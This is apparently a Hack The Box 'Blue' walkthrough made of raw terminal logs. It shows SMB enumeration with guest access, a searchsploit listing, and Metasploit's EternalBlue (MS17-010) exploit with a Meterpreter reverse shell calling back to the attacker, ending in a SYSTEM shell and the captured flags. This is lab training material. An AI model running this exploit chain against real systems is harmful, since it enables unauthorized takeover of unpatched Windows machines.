# Blue -HTB Easy

## Nmap

```
nmap -sC -sV -oA nmap 10.10.10.40  --stats-every=5s

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-10-06T16:18:11
|_  start_date: 2024-10-06T16:14:30
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-10-06T17:18:12+01:00
|_clock-skew: mean: -19m56s, deviation: 34m35s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.27 seconds
```

## Smb enumeration

### Rpcclient



````
```log
                                                                                                                                                                                                                                                                              
[Oct 06, 2024 - 18:21:35 (CEST)] exegol-htb_lame /workspace # rpcclient -U "" 10.10.10.40
Password for [WORKGROUP\]:
rpcclient $> srvinfo
        10.10.10.40    Wk Sv NT PtB LMB     
        platform_id     :       500
        os version      :       6.1
        server type     :       0x51003
rpcclient $> enumdomains
name:[haris-PC] idx:[0x0]
name:[Builtin] idx:[0x0]
rpcclient $> querydominfo
Domain:         haris-PC
Server:
Comment:
Total Users:    3
Total Groups:   1
Total Aliases:  0
Sequence No:    38
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
rpcclient $> netshareenumall
result was WERR_ACCESS_DENIED
rpcclient $> enumdomusers
rpcclient $> exit

[Oct 06, 2024 - 18:23:36 (CEST)] exegol-htb_lame /workspace # crackmapexec smb 10.10.10.40 --shares -u '' -p ''                                                                                                                                                              

[*] Adding missing option 'reveal_chars_of_pwd' in config section 'CME' to cme.conf
[*] Adding missing option 'host_info_colors' in config section 'CME' to cme.conf
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
SMB         10.10.10.40     445    HARIS-PC         [+] haris-PC\: 
SMB         10.10.10.40     445    HARIS-PC         [-] Error enumerating shares: STATUS_ACCESS_DENIED
[Oct 06, 2024 - 18:24:22 (CEST)] exegol-htb_lame /workspace # crackmapexec smb 10.10.10.40 --shares -u 'guest' -p ''

SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
SMB         10.10.10.40     445    HARIS-PC         [+] haris-PC\guest: 
SMB         10.10.10.40     445    HARIS-PC         [*] Enumerated shares
SMB         10.10.10.40     445    HARIS-PC         Share           Permissions     Remark
SMB         10.10.10.40     445    HARIS-PC         -----           -----------     ------
SMB         10.10.10.40     445    HARIS-PC         ADMIN$                          Remote Admin
SMB         10.10.10.40     445    HARIS-PC         C$                              Default share
SMB         10.10.10.40     445    HARIS-PC         IPC$                            Remote IPC
SMB         10.10.10.40     445    HARIS-PC         Share           READ            
SMB         10.10.10.40     445    HARIS-PC         Users           READ            


````

### CME

```
[Oct 06, 2024 - 18:24:41 (CEST)] exegol-htb_lame /workspace # crackmapexec smb 10.10.10.40 --users -u 'guest' -p ''                                                                                                                                                          

SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
SMB         10.10.10.40     445    HARIS-PC         [+] haris-PC\guest: 
SMB         10.10.10.40     445    HARIS-PC         [*] Trying to dump local users with SAMRPC protocol
SMB         10.10.10.40     445    HARIS-PC         [-] Error enumerating domain user(s)


```

### Smbmap

```
[Oct 06, 2024 - 18:23:12 (CEST)] exegol-htb_lame /workspace # smbmap -u guest -H "10.10.10.40"       

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                          
                                                                                                                                            
[+] IP: 10.10.10.40:445 Name: 10.10.10.40               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        Share                                                   READ ONLY
        Users                                                   READ ONLY
[Oct 06, 2024 - 18:26:45 (CEST)] exegol-htb_lame /workspace # smbmap -H 10.10.10.40 -r Users                                                                                                                                                                              

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                          
[!] Access denied on 10.10.10.40, no fun for you...                                                                      
[Oct 06, 2024 - 18:28:29 (CEST)] exegol-htb_lame /workspace # smbmap -H 10.10.10.40 -r Users -u 'guest' -p ''

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                      
                                                                                                                                            
[+] IP: 10.10.10.40:445 Name: 10.10.10.40               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        Share                                                   READ ONLY
        Users                                                   READ ONLY
        ./Users
        dw--w--w--                0 Fri Jul 21 08:56:23 2017    .
        dw--w--w--                0 Fri Jul 21 08:56:23 2017    ..
        dw--w--w--                0 Sat Jul 15 00:37:45 2017    Default
        fr--r--r--              174 Sat Jul 15 00:32:23 2017    desktop.ini
        dw--w--w--                0 Fri Jul 21 08:40:38 2017    Public
[Oct 06, 2024 - 18:28:44 (CEST)] exegol-htb_lame /workspace # smbmap -H 10.10.10.40 --download "Users\Default" -u 'guest' -p ''             

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                      
[+] Starting download: Users\Default (0 bytes)                                                                           
[Oct 06, 2024 - 18:30:08 (CEST)] exegol-htb_lame /workspace # smbmap -H 10.10.10.40 --download "Users\desktop.ini" -u 'guest' -p ''                                                                                                                                          

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                      
[+] Starting download: Users\desktop.ini (174 bytes)                                                                     
[+] File output to: /workspace/10.10.10.40-Users_desktop.ini                                                             
[Oct 06, 2024 - 18:30:24 (CEST)] exegol-htb_lame /workspace # cat 10.10.10.40-Users_desktop.ini                          

[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813
[Oct 06, 2024 - 18:30:29 (CEST)] exegol-htb_lame /workspace # smbmap -H 10.10.10.40 -r Share -u 'guest' -p ''                                                                                                                                                                

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                      
                                                                                                                                            
[+] IP: 10.10.10.40:445 Name: 10.10.10.40               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        Share                                                   READ ONLY
        ./Share
        dr--r--r--                0 Fri Jul 21 08:44:22 2017    .
        dr--r--r--                0 Fri Jul 21 08:44:22 2017    ..
        Users                                                   READ ONLY
```

## Searchsploit smb

````
```log
[Oct 06, 2024 - 18:43:41 (CEST)] exegol-htb_lame /workspace # searchsploit microsoft smb

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                              |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft DNS RPC Service - 'extractQuotedChar()' Remote Overflow 'SMB' (MS07-029) (Metasploit)                                                                                                                                             | windows/remote/16366.rb
Microsoft SMB Driver - Local Denial of Service                                                                                                                                                                                              | windows/dos/28001.c
Microsoft - SMB Server Trans2 Zero Size Pool Alloc (MS10-054)                                                                                                                                                                               | windows/dos/14607.py
Microsoft Windows 10.0.17134.648 - HTTP -> SMB NTLM Reflection Leads to Privilege Elevation                                                                                                                                                 | windows/local/47115.txt
Microsoft Windows 10 (1903/1909) - 'SMBGhost' SMB3.1.1 'SMB2_COMPRESSION_CAPABILITIES' Buffer Overflow (PoC)                                                                                                                                | windows/dos/48216.md
Microsoft Windows 10 (1903/1909) - 'SMBGhost' SMB3.1.1 'SMB2_COMPRESSION_CAPABILITIES' Local Privilege Escalation                                                                                                                           | windows/local/48267.txt
Microsoft Windows 10 - SMBv3 Tree Connect (PoC)                                                                                                                                                                                             | windows/dos/41222.py
Microsoft Windows 2000/XP - SMB Authentication Remote Overflow                                                                                                                                                                              | windows/remote/20.txt
Microsoft Windows 2003 SP2 - 'ERRATICGOPHER' SMB Remote Code Execution                                                                                                                                                                      | windows/remote/41929.py
Microsoft Windows 2003 SP2 - 'RRAS' SMB Remote Code Execution                                                                                                                                                                               | windows/remote/44616.py
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                                                                                                            | windows/remote/42031.py
Microsoft Windows 7/2008 R2 - SMB Client Trans2 Stack Overflow (MS10-020) (PoC)                                                                                                                                                             | windows/dos/12273.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                                                                                        | windows/remote/42315.py
Microsoft Windows 8.1/2012 R2 - SMBv3 Null Pointer Dereference Denial of Service                                                                                                                                                            | windows/dos/44189.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                                                                                                  | windows_x86-64/remote/42030.py
Microsoft Windows 95/Windows for Workgroups - 'smbclient' Directory Traversal                                                                                                                                                               | windows/remote/20371.txt
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)                                                                                                                   | windows/remote/43970.rb
Microsoft Windows - LSASS SMB NTLM Exchange Null-Pointer Dereference (MS16-137)                                                                                                                                                             | windows/dos/40744.txt
Microsoft Windows NT 4.0 SP5 / Terminal Server 4.0 - 'Pass the Hash' with Modified SMB Client                                                                                                                                               | windows/remote/19197.txt
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                                                                                                                                               | windows_x86-64/remote/41987.py
Microsoft Windows - SMB2 Negotiate Protocol '0x72' Response Denial of Service                                                                                                                                                               | windows/dos/12524.py
Microsoft Windows - SMB Client-Side Bug (PoC) (MS10-006)                                                                                                                                                                                    | windows/dos/12258.py
Microsoft Windows - 'SMBGhost' Remote Code Execution                                                                                                                                                                                        | windows/remote/48537.py
Microsoft Windows - SmbRelay3 NTLM Replay (MS08-068)                                                                                                                                                                                        | windows/remote/7125.txt
Microsoft Windows - SMB Relay Code Execution (MS08-068) (Metasploit)                                                                                                                                                                        | windows/remote/16360.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                                                                                                                                               | windows/dos/41891.rb
Microsoft Windows SMB Server (v1/v2) - Mount Point Arbitrary Device Open Privilege Escalation                                                                                                                                               | windows/dos/43517.txt
Microsoft Windows - 'SMB' Transaction Response Handling (MS05-011)                                                                                                                                                                          | windows/dos/1065.c
Microsoft Windows - 'srv2.sys' SMB Code Execution (Python) (MS09-050)                                                                                                                                                                       | windows/remote/40280.py
Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050) (Metasploit)                                                                                                                                   | windows/remote/16363.rb
Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050)                                                                                                                                                | windows/remote/14674.txt
Microsoft Windows Vista/7 - SMB2.0 Negotiate Protocol Request Remote Blue Screen of Death (MS07-063)                                                                                                                                        | windows/dos/9594.txt
Microsoft Windows - 'WRITE_ANDX' SMB Command Handling Kernel Denial of Service (Metasploit)                                                                                                                                                 | windows/dos/6463.rb
Microsoft Windows XP/2000 - 'Mrxsmb.sys' Local Privilege Escalation (MS06-030)                                                                                                                                                              | windows/local/1911.c
Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (1)                                                                                                                                                   | windows/dos/21746.c
Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (2)                                                                                                                                                   | windows/dos/21747.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
````



## EternalBlue

````
```log
[Oct 06, 2024 - 18:45:34 (CEST)] exegol-htb_lame /workspace # msfconsole -q
msf6 > search ms17-10
[-] No results from search
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.17.0.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0  
LHOST => 10.10.16.2
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options                                                                                                                                                                                                                

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.10.40      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit 

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
whoami
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (201798 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.10.10.40:49158) at 2024-10-06 18:49:38 +0200
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > shell
Process 244 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type c:\Users\haris\Desktop\flag.txt
type c:\Users\haris\Desktop\flag.txt
The system cannot find the file specified.

C:\Windows\system32>dir c:\Users\haris\Desktop
dir c:\Users\haris\Desktop
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of c:\Users\haris\Desktop

24/12/2017  03:23    <DIR>          .
24/12/2017  03:23    <DIR>          ..
06/10/2024  17:15                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,691,121,152 bytes free

C:\Windows\system32>type c:\Users\haris\Desktop\user.txt
type c:\Users\haris\Desktop\user.txt
f3694324e928d3e8a715cc76ba2c6f5c

C:\Windows\system32>type c:\Users\Administrator\Desktop\root.txt
type c:\Users\Administrator\Desktop\root.txt
1c004e4d541cb0d43f428d20b9d2f92e

C:\Windows\system32>

```
````







